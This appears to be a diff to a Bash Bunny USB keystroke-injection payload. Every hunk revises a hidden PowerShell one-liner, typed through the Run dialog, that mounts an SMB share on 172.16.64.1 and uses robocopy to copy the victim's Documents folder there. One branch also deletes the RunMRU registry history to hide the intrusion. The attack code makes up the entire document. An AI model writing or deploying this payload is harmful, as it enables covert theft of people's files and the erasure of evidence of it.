@@ -44,7 +44,7 @@ if [ $CLEARTRACKS == "yes" ]; then
    QUACK Delay 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING PowerShell -WindowStyle Hidden \"Test-NetConnection 172.16.64.1 SMB;net use \\\172.16.64.1\e guest /USER:guest;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*'"
+   QUACK STRING PowerShell -W Hidden \"While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\;rp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -N '*'"
    QUACK ENTER
 fi
 
@@ -53,7 +53,7 @@ if [ $CLEARTRACKS == "no" ]; then
    QUACK DELAY 500
    QUACK GUI r
    QUACK DELAY 500
-   QUACK STRING PowerShell -WindowStyle Hidden \"Test-NetConnection 172.16.64.1 SMB;net use \\\172.16.64.1\e guest /USER:guest;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S\
+   QUACK STRING PowerShell -W Hidden \"While(!(TNC 172.16.64.1 SMB -I quiet)){};net use \\\172.16.64.1\e PWD /USER:USER;robocopy \$HOME\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S
    QUACK ENTER
 fi
 
